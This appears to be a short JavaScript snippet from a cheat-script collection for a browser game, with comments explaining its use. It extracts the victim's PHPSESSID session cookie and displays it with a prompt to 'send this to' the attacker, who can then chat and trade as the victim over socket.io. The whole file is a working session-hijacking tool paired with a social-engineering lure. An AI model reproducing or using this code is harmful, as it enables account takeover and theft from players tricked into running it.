// The Session ID is the key used for socket.io, AKA trade and chat.
// Using a Repl (or something else, Replit works best for me), you can connect VIA this sess ID and chat/trade as the ID's user.
// Use the custom message field to show someting like this! "PHPSESSID - send this to BlacketWare"
let custommessage = '- send this to [your name]';
alert(document.cookie.split(';').map(v => v.split('=')).reduce((acc, v) => {
    acc[decodeURIComponent(v[0].trim())] = decodeURIComponent(v[1].trim());
    return acc;
}, {}).PHPSESSID + ' ' + custommessage);
